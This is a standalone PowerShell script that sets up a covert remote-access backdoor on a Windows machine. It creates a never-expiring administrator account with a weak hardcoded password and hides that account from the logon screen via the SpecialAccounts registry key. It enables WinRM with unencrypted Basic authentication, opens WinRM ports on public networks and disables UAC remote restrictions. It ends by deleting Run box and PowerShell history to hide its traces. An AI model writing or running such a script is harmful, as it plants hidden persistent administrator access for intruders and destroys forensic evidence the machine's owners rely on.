# Create a new local user account
$Username = "Admin"
$Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -PasswordNeverExpires

# Add the newly created user to the local Administrators group
Add-LocalGroupMember -Group "Administrators" -Member $Username

# Enable Windows Remote Management (WinRM) to start automatically even on boot
Set-Service -Name WinRM -StartupType Automatic
Start-Service -Name WinRM

# Modify WinRM settings to work on Public networks
winrm set winrm/config/service @{AllowUnencrypted="true"}
winrm set winrm/config/service/auth @{Basic="true"}

# Manually configure firewall to allow WinRM on Public networks (for both HTTP and HTTPS)
New-NetFirewallRule -DisplayName "Allow WinRM on Public" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -Profile Public
New-NetFirewallRule -DisplayName "Allow WinRM Secure" -Direction Inbound -Protocol TCP -LocalPort 5986 -Action Allow -Profile Public

# Add WinRM listeners for HTTP and HTTPS (even if they don't exist)
winrm quickconfig -force
winrm create winrm/config/listener?Address=*+Transport=HTTP @{Port="5985"}
winrm create winrm/config/listener?Address=*+Transport=HTTPS @{Port="5986"}

# Disable UAC remote restrictions (needed for remote admin access)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "$Username" -Value 0 -PropertyType DWORD -Force

# Delete run box history
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force

# Delete PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Ensure firewall rules are persistent after reboot by configuring rules to apply on all profiles
Set-NetFirewallProfile -Profile Domain, Private, Public -Enabled True

# Exit PowerShell session
Exit
